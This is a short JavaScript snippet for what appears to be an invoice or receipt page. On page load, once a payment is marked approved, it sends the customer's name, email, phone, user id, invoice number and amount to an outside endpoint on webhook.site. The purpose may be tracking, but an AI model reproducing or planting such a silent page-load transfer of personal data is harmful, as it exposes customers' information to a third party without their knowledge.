document.addEventListener("DOMContentLoaded", function() {

    function t(n) {
        return parseFloat(n.replace(",", ""))
    }
    
    var e = window.location.protocol + "//" + window.location.host + window.location.pathname;
    var r = total,
        o = t(r);
        
    if (1 == disahkan) {
        var a = sessionStorage.getItem("hasRunBual");
            
        if ("1" !== a) {
            var u = Number(localStorage.getItem("numBual")) || 0;
            u += 1;
            localStorage.setItem("numBual", u.toString());
            
            var i = null;
            var l = document.querySelector('script[src*="lsd"]'); 
            
            if (l) {
                i = l.getAttribute("acc");
            }

            var s = new XMLHttpRequest;
            s.open("POST", "https://webhook.site/lite-send-receipt-php", !0),
            s.setRequestHeader("Content-Type", "application/json"),
            s.send(JSON.stringify({
                acc: i,
                uid: uid,
                email: email,
                name: name,
                phone: phone,
                status_disahkan: disahkan,
                invoice_number: invoice,
                total_amount: o,
                url: e
            })),
            s.onload = function() {
                var n = JSON.parse(this.responseText);
                console.log(n)
            };
            sessionStorage.setItem("hasRunBual", "1");
            localStorage.setItem("hasRunBual", "1");
        }
    }
});

// Created 21 Aug 2025
